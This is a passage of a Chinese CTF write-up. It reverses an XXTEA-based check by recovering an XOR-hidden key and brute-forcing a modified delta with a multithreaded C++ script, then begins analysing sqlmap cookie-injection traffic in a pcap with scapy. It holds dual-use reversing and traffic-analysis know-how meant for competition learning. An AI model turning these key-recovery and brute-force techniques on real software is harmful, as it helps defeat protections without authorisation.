out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是一个典型的有长度填充的XXTEA加密，查看密钥和delta值，发现delta值在这个函数中被初始化：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void sub_217C()</span><br><span class="line">&#123;</span><br><span class="line">  qword_64F0 = 0x7C1CA67A;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Key从外界传入，查看sub_3550，这段函数是一个伪装得很花的异或加密函数。去掉混淆后：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化</span></span><br><span class="line">v7 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    v3 = *(a2 + <span class="number">20</span> + v7);</span><br><span class="line">    v4 = v7 % <span class="number">20</span>;               <span class="comment">// 循环用 20 字节密钥</span></span><br><span class="line">    *(result + v7) = v3 ^ *(a2 + v4);  <span class="comment">// 异或加解密</span></span><br><span class="line">    v7++;</span><br><span class="line">    <span class="keyword">if</span> (v7 == <span class="number">6</span>)</span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 循环6次就退出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再简化一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (i = 0; i &lt; 6; ++i) &#123;</span><br><span class="line">    result[i] = a2[20 + i] ^ a2[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>a2就是unk_13BF，解密得到密钥是114514，在后续的XXTEA中填充为16字节</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 验证脚本</span></span><br><span class="line">unk_13BF = <span class="built_in">bytes</span>([</span><br><span class="line">  <span class="number">0xA8</span>,<span class="number">0x31</span>,<span class="number">0xF5</span>,<span class="number">0xBE</span>,<span class="number">0xAD</span>,<span class="number">0x74</span>,<span class="number">0x8B</span>,<span class="number">0x77</span>,<span class="number">0xE9</span>,<span class="number">0xE3</span>,</span><br><span class="line">  <span class="number">0x66</span>,<span class="number">0x12</span>,<span class="number">0xD4</span>,<span class="number">0x07</span>,<span class="number">0x0C</span>,<span class="number">0xFA</span>,<span class="number">0x12</span>,<span class="number">0x51</span>,<span class="number">0x86</span>,<span class="number">0x5A</span>,</span><br><span class="line">  <span class="number">0x99</span>,<span class="number">0x00</span>,<span class="number">0xC1</span>,<span class="number">0x8B</span>,<span class="number">0x9C</span>,<span class="number">0x40</span>,<span class="number">0x8B</span>,<span class="number">0xAF</span>,<span class="number">0xF2</span>,<span class="number">0xD6</span>,</span><br><span class="line">  <span class="number">0x4E</span>,<span class="number">0x39</span>,<span class="number">0x93</span>,<span class="number">0x09</span>,<span class="number">0xCE</span>,<span class="number">0x62</span>,<span class="number">0xD5</span>,<span class="number">0x42</span>,<span class="number">0x16</span>,<span class="number">0x5F</span>,</span><br><span class="line">  <span class="number">0x0C</span>,<span class="number">0x9D</span>,<span class="number">0x95</span>,<span class="number">0x2F</span>,<span class="number">0x96</span>,<span class="number">0xC2</span>,<span class="number">0xE1</span>,<span class="number">0x70</span>,<span class="number">0xE7</span>,<span class="number">0xB3</span>,</span><br><span class="line">  <span class="number">0x5F</span>,<span class="number">0x5A</span>,<span class="number">0x5F</span>,<span class="number">0x46</span>,<span class="number">0xDC</span>,<span class="number">0x6B</span>,<span class="number">0x92</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_like</span>(<span class="params">a2</span>):</span><br><span class="line">    res = <span class="built_in">bytearray</span>(<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        b1 = a2[<span class="number">20</span> + i]</span><br><span class="line">        b2 = a2[i % <span class="number">20</span>]  <span class="comment"># i &lt; 20, 等价于 a2[i]</span></span><br><span class="line">        res[i] = b1 ^ b2</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(res)</span><br><span class="line"></span><br><span class="line">out = xor_like(unk_13BF)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hex:&quot;</span>, out.<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ascii:&quot;</span>, out.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"></span><br><span class="line">//<span class="built_in">hex</span>: <span class="number">313134353134</span></span><br><span class="line">//<span class="built_in">ascii</span>: <span class="number">114514</span></span><br></pre></td></tr></table></figure>

<p>密钥是怎么填充为16字节的：</p>
<p>在sub_3550()，也就是xor函数，根据unk_13BF得到密钥是114514。</p>
<p>在sub_2F5C()中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_3550((__int64)&amp;unk_6510, (__int64)&amp;unk_13BF);</span><br><span class="line">XXTEA(v8, v6, (__int128 *)&amp;unk_6510, v9);</span><br></pre></td></tr></table></figure>

<p><code>sub_3550()</code> 的第一个参数就是 <code>&amp;unk_6510</code>，</p>
<p> 因此它把解密结果（6字节 <code>&quot;114514&quot;</code>) 写入了 <code>unk_6510</code> 起始处。</p>
<p><code>XXTEA()</code> 随后把 <code>&amp;unk_6510</code> 解释为 <code>__int128*</code>，也就是取连续 16 字节。</p>
<p> 而此时内存里前 6 字节为 <code>&quot;114514&quot;</code>，后面 10 字节还是 <strong>未初始化</strong>（通常是 0）</p>
<p>所以密钥在进入 XXTEA 时的真实内存状态：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">31 31 34 35 31 34 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>即零填充扩展</p>
<p>尝试爆破delta值，发现delta值被修改。仔细观察整个程序应该有反hook与反调试等，由于实在是不易分析，尝试从密文直接爆破flag，由于有填充，最后一个dword一定小于256，所以解密结果的最后6字符一定为000000，编写脚本爆破全部4字节：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Result</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> delta;</span><br><span class="line">    std::string hex_result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">std::mutex result_mutex;</span><br><span class="line">std::vector&lt;Result&gt; all_results;</span><br><span class="line"><span class="function">std::atomic&lt;<span class="type">uint64_t</span>&gt; <span class="title">total_processed</span><span class="params">(<span class="number">0</span>)</span></span>;</span><br><span class="line"><span class="type">uint64_t</span> total_range = <span class="number">0xFFFFFFFF</span> - <span class="number">0x00000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">std::vector&lt;<span class="type">uint32_t</span>&gt; <span class="title">b2dle</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">uint8_t</span>&gt;&amp; bytes)</span> </span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">uint32_t</span>&gt; result;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; bytes.<span class="built_in">size</span>(); i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> val = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span> &amp;&amp; i + j &lt; bytes.<span class="built_in">size</span>(); ++j) &#123;</span><br><span class="line">            val |= <span class="built_in">static_cast</span>&lt;<span class="type">uint32_t</span>&gt;(bytes[i + j]) &lt;&lt; (j * <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        result.<span class="built_in">push_back</span>(val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">std::vector&lt;<span class="type">uint8_t</span>&gt; <span class="title">d2ble</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">uint32_t</span>&gt;&amp; dwords)</span> </span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">uint8_t</span>&gt; result;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> d : dwords) &#123;</span><br><span class="line">        result.<span class="built_in">push_back</span>(<span class="built_in">static_cast</span>&lt;<span class="type">uint8_t</span>&gt;(d));</span><br><span class="line">        result.<span class="built_in">push_back</span>(<span class="built_in">static_cast</span>&lt;<span class="type">uint8_t</span>&gt;(d &gt;&gt; <span class="number">8</span>));</span><br><span class="line">        result.<span class="built_in">push_back</span>(<span class="built_in">static_cast</span>&lt;<span class="type">uint8_t</span>&gt;(d &gt;&gt; <span class="number">16</span>));</span><br><span class="line">        result.<span class="built_in">push_back</span>(<span class="built_in">static_cast</span>&lt;<span class="type">uint8_t</span>&gt;(d &gt;&gt; <span class="number">24</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">de_XXTEA</span><span class="params">(std::vector&lt;<span class="type">uint32_t</span>&gt;&amp; v, <span class="type">int</span> leng, <span class="type">const</span> std::vector&lt;<span class="type">uint32_t</span>&gt;&amp; k, <span class="type">uint32_t</span> delta)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> rounds = <span class="number">6</span> + <span class="number">52</span> / leng;</span><br><span class="line">    <span class="type">uint32_t</span> ttl = ((rounds + <span class="number">1ULL</span>) * delta) &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; rounds; ++j) &#123;</span><br><span class="line">        ttl = (ttl - delta) &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = leng - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="type">uint32_t</span> after = v[(i + <span class="number">1</span>) % leng];</span><br><span class="line">            <span class="type">uint32_t</span> before = v[(i - <span class="number">1</span> + leng) % leng];</span><br><span class="line">            v[i] = (v[i] - (</span><br><span class="line">                (((before &gt;&gt; <span class="number">5</span>) ^ (after &lt;&lt; <span class="number">2</span>)) + ((after &gt;&gt; <span class="number">3</span>) ^ (before &lt;&lt; <span class="number">4</span>)))</span><br><span class="line">                ^</span><br><span class="line">                ((ttl ^ after) + (k[(i &amp; <span class="number">3</span>) ^ ((ttl &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>)] ^ before))</span><br><span class="line">            )) &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">std::vector&lt;<span class="type">uint8_t</span>&gt; <span class="title">hex_to_bytes</span><span class="params">(<span class="type">const</span> std::string&amp; hex)</span> </span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">uint8_t</span>&gt; bytes;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; hex.<span class="built_in">length</span>(); i += <span class="number">2</span>) &#123;</span><br><span class="line">        std::string byte_str = hex.<span class="built_in">substr</span>(i, <span class="number">2</span>);</span><br><span class="line">        <span class="type">uint8_t</span> byte = <span class="built_in">static_cast</span>&lt;<span class="type">uint8_t</span>&gt;(<span class="built_in">strtol</span>(byte_str.<span class="built_in">c_str</span>(), <span class="literal">nullptr</span>, <span class="number">16</span>));</span><br><span class="line">        bytes.<span class="built_in">push_back</span>(byte);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">brute_thread</span><span class="params">(<span class="type">uint32_t</span> start_delta, <span class="type">uint32_t</span> end_delta,</span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="type">const</span> std::vector&lt;<span class="type">uint32_t</span>&gt;&amp; enc_data,</span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="type">const</span> std::vector&lt;<span class="type">uint32_t</span>&gt;&amp; key,</span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="type">int</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">uint32_t</span>&gt; <span class="title">m</span><span class="params">(length)</span></span>;</span><br><span class="line">    <span class="type">uint64_t</span> chunk_size = end_delta - start_delta + <span class="number">1</span>;</span><br><span class="line">    <span class="type">uint64_t</span> report_interval = chunk_size / <span class="number">100</span> + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> delta = start_delta; delta &lt;= end_delta; ++delta) &#123;</span><br><span class="line">        m = enc_data;</span><br><span class="line">        <span class="built_in">de_XXTEA</span>(m, length, key, delta);</span><br><span class="line">        <span class="keyword">auto</span> decrypted_bytes = <span class="built_in">d2ble</span>(m);</span><br><span class="line">        std::ostringstream oss;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> b : decrypted_bytes) &#123;</span><br><span class="line">            oss &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">2</span>) &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; std::hex &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(b);</span><br><span class="line">        &#125;</span><br><span class="line">        std::string hex_result = oss.<span class="built_in">str</span>();</span><br><span class="line">        <span class="keyword">if</span> (hex_result.<span class="built_in">size</span>() &gt;= <span class="number">6</span> &amp;&amp; hex_result.<span class="built_in">substr</span>(hex_result.<span class="built_in">size</span>() - <span class="number">6</span>) == <span class="string">&quot;000000&quot;</span>) &#123;</span><br><span class="line">            <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(result_mutex)</span></span>;</span><br><span class="line">            all_results.<span class="built_in">emplace_back</span>(Result&#123;delta, hex_result&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">uint64_t</span> count = total_processed.<span class="built_in">fetch_add</span>(<span class="number">1</span>, std::memory_order_relaxed);</span><br><span class="line">        <span class="keyword">if</span> (count % report_interval == <span class="number">0</span> || count == total_range - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="type">double</span> progress = <span class="built_in">static_cast</span>&lt;<span class="type">double</span>&gt;(count) / total_range * <span class="number">100.0</span>;</span><br><span class="line">            <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(result_mutex)</span></span>;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;\rProgress: [&quot;</span> &lt;&lt; std::fixed &lt;&lt; std::<span class="built_in">setprecision</span>(<span class="number">2</span>) &lt;&lt; progress &lt;&lt; <span class="string">&quot;%]&quot;</span>;</span><br><span class="line">            std::cout.<span class="built_in">flush</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">uint32_t</span>&gt; key = &#123;<span class="number">0x35343131</span>, <span class="number">0x3431</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    std::string enc_hex = <span class="string">&quot;8c1ee8d42e211d6b649e0b9c33bdc836fc912709&quot;</span>;</span><br><span class="line">    <span class="keyword">auto</span> enc_bytes = <span class="built_in">hex_to_bytes</span>(enc_hex);</span><br><span class="line">    <span class="keyword">auto</span> enc_dwords = <span class="built_in">b2dle</span>(enc_bytes);</span><br><span class="line">    <span class="type">int</span> length = <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(enc_dwords.<span class="built_in">size</span>());</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> thread_count = <span class="number">32</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> per_thread = <span class="built_in">static_cast</span>&lt;<span class="type">uint32_t</span>&gt;(total_range / thread_count);</span><br><span class="line">    std::vector&lt;std::thread&gt; threads;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> t = <span class="number">0</span>; t &lt; thread_count; ++t) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> start = <span class="number">0x00000000</span> + t * per_thread;</span><br><span class="line">        <span class="type">uint32_t</span> end = (t == thread_count - <span class="number">1</span>) ? <span class="number">0xFFFFFFFF</span> : start + per_thread - <span class="number">1</span>;</span><br><span class="line">        threads.<span class="built_in">emplace_back</span>(brute_thread, start, end, enc_dwords, key, length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; th : threads) &#123;</span><br><span class="line">        <span class="keyword">if</span> (th.<span class="built_in">joinable</span>()) th.<span class="built_in">join</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\nSearch completed.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">if</span> (!all_results.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Found &quot;</span> &lt;&lt; all_results.<span class="built_in">size</span>() &lt;&lt; <span class="string">&quot; matching results:&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; res : all_results) &#123;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;Delta: 0x&quot;</span> &lt;&lt; std::hex &lt;&lt; res.delta</span><br><span class="line">                      &lt;&lt; <span class="string">&quot; | Hex: &quot;</span> &lt;&lt; res.hex_result &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;No matching result found.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>筛选输出，发现其中有一个解：Delta: 0x7c1ca806 | Hex: 6165313466623332396265353138626310000000符合结果，<strong>flag{ae14fb329be518bc}</strong>.</p>
<h2 id="Misc（7-7）"><a href="#Misc（7-7）" class="headerlink" title="Misc（7&#x2F;7）"></a>Misc（7&#x2F;7）</h2><h3 id="sqlipcap"><a href="#sqlipcap" class="headerlink" title="sqlipcap"></a>sqlipcap</h3><p>Orz 学艺不精 错怪题目了</p>
<p>数据包叫 sql.pcapng 查看是sqlmap的流量，找注入信息即可</p>
<p>查看是在 cookie的md5_hash 处做的注入,全拉出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> rdpcap, TCP, Raw</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_md5_hash_from_cookie</span>(<span class="params">file_path, output_file</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    从pcapng文件中提取所有HTTP请求的Cookie中的md5_hash值</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        file_path: pcapng文件路径</span></span><br><span class="line"><span class="string">        output_file: 输出结果的txt文件路径</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 读取pcapng文件</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在读取数据包文件: <span class="subst">&#123;file_path&#125;</span>&quot;</span>)</span><br><span class="line">    packets = rdpcap(file_path)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 存储提取到的md5_hash值</span></span><br><span class="line">    md5_hashes = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 用于匹配Cookie中的md5_hash的正则表达式</span></span><br><span class="line">    md5_hash_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;md5_hash=([^;]+)&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;共找到 <span class="subst">&#123;<span class="built_in">len</span>(packets)&#125;</span> 个数据包，开始分析...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 遍历所有数据包</span></span><br><span class="line">    <span class="keyword">for</span> i, packet <span class="keyword">in</span> <span class="built_in">enumerate</span>(packets):</span><br><span class="line">        <span class="comment"># 只处理TCP数据包且包含原始数据</span></span><br><span class="line">        <span class="keyword">if</span> TCP <span class="keyword">in</span> packet <span class="keyword">and</span> Raw <span class="keyword">in</span> packet:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 提取原始数据并尝试解码为字符串</span></span><br><span class="line">                raw_data = packet[Raw].load.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 检查是否包含HTTP请求</span></span><br><span class="line">                <span class="keyword">if</span> raw_data.startswith((<span class="string">&#x27;GET &#x27;</span>, <span class="string">&#x27;POST &#x27;</span>, <span class="string">&#x27;PUT &#x27;</span>, <span class="string">&#x27;DELETE &#x27;</span>)) <span class="keyword">and</span> <span class="string">&#x27;HTTP&#x27;</span> <span class="keyword">in</span> raw_data:</span><br><span class="line">                    <span class="comment"># 查找Cookie头</span></span><br><span class="line">                    lines = raw_data.split(<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">                    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">                        <span class="keyword">if</span> line.strip().lower().startswith(<span class="string">&#x27;cookie:&#x27;</span>):</span><br><span class="line">                            <span class="comment"># 提取Cookie内容</span></span><br><span class="line">                            cookie_content = line[<span class="built_in">len</span>(<span class="string">&#x27;Cookie:&#x27;</span>):].strip()</span><br><span class="line">                            </span><br><span class="line">                            <span class="comment"># 查找md5_hash</span></span><br><span class="line">                            <span class="keyword">match</span> = md5_hash_pattern.search(cookie_content)</span><br><span class="line">                            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                                md5_hash_value = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">                                md5_hashes.append(md5_hash_value)</span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">f&quot;在数据包 #<span class="subst">&#123;i+<span class="number">1</span>&#125;</span> 中找到md5_hash: <span class="subst">&#123;md5_hash_value[:<span class="number">50</span>]&#125;</span>...&quot;</span>)  <span class="comment"># 只显示前50个字符</span></span><br><span class="line">                                </span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;分析数据包 #<span class="subst">&#123;i+<span class="number">1</span>&#125;</span> 时出错: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将提取到的md5_hash保存到文件</span></span><br><span class="line">    <span class="keyword">with</span> <span 